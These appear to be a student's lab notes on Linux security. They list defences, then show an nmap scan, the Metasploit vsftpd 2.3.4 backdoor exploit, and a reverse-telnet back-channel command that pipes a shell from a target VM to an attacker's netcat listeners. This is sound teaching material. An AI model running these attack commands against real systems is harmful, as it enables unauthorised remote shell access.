
> [!NOTE] How to gain remote access to linux device?
> Linux has two levels of access: **root** and **user** 
> **Root** remains a single point of attack
> ![[Pasted image 20240608171714.png]]

> [!NOTE] TLDR
> - Linux is a complex system that requires adequate security measures.
> - Once the IP address of a target system is known, an attacker can begin port scanning, looking for security holes in the target system for gaining access.
> - Many remote exploitation techniques may allow attackers to subvert the Linux system and to obtain a shell access.
# Main defense mechanism for Linux systems
defense mechanism for Linux systems:
- **Software Updates**: Patching vulnerabilities is crucial to ensure the latest security fixes. 
- **Firewall**: Act as a gatekeeper. Configure firewalls to block unauthorized incoming and outgoing traffic, restricting access only to essential services and trusted sources. 
- **User Accounts**: The principle of least privilege. Create user accounts with minimal permissions and avoid using the root account for everyday tasks. 
- **Strong Passwords & Authentication**: Enforce strong passwords with complexity requirements and consider two-factor authentication (2FA) for added security. 
- **Secure Shell (SSH)**: Encrypt remote access. Use SSH instead of Telnet to ensure all communication, including passwords, is encrypted during remote administration sessions. 
- **Permissions & Access Control**: Control access to files and directories. Set appropriate permissions (read, write, execute) for users and groups to restrict unauthorized access.




# Linux attacks
**Attackers follow a logical progression:**
1. **First, gain Remote Access via the network**
	1. Typically exploiting a vulnerability in a listening service
2. **Then, have a command shell or login to the system**
	1. Local attacks are also called **Privilege Escalation Attacks**

**First step is to scan the victim remotely**
1. Scan the VM remotely: 
	1. ***nmap -A** \<IP>*
2. You can use the results to search online for related vulnerabilities
	1. E.g., OpenSSH 4.7p1, vsftpd 2.3.4
3. Let’s exploit the vulnerability in vsftpd 2.3.4 to gain remote access

## Exploiting Backdoor in vsftpd 2.3.4
1. Launch Metasploit Framework Console: **# msfconsole**
2. search *Variable*
```shell
>search vsftpd 
>use exploit/unix/ftp/vsftpd_234_backdoor 
>show options 
>set ROSTS 
>run
```
3. You will see that you got shell access to the Metasploitable VM.
4. Verify it by running **ifconfig**
![[Pasted image 20240608172521.png]]
### SSH Brute Force Attack
- The attacker brute forces SSH to login remotely.
- Use Metasploit to gain shell access.
![[Pasted image 20240608172441.png]]

# Reverse telnet and [[Back Channel]]
- **Back channel** as a mechanism where the communication channel originates from the target system rather than from the attacking system.
- In **reverse telnet**, telnet is used to create a back channel from the target system to the attackers’ system.

## How does an attacker use Back Channel?
1. The attacker runs the following commands in two separate windows on the attacker’s system **(kali, IP = 10.0.2.4)**
```root
# nc -l -n -v -p 80 
# nc -l -n -v -p 25
```
1. The attacker exploits a vulnerability to run the following command in the target system **(metasploitable, IP = 10.0.2.5)**
```root
# telnet 10.0.2.4 80 | sh | telnet 10.0.2.4 25
```

**Response:**
```root
Trying 10.0.2.4.
Connected to 10.0.2.4.
Escape character is '^]'
sh: line 1: Trying: command not found
sh: line 2: Connected: command not found
sh: line 3 Escape: command not found
```

3. Now the attacker’s shell windows are connected to the target system
4. The attacker runs a command in the first window on the attacker’s system. The target system reads the commands, executes it locally, and it returns the result to the second window of the attacker
![[Pasted image 20240608173037.png]]
![[Pasted image 20240608173045.png]]


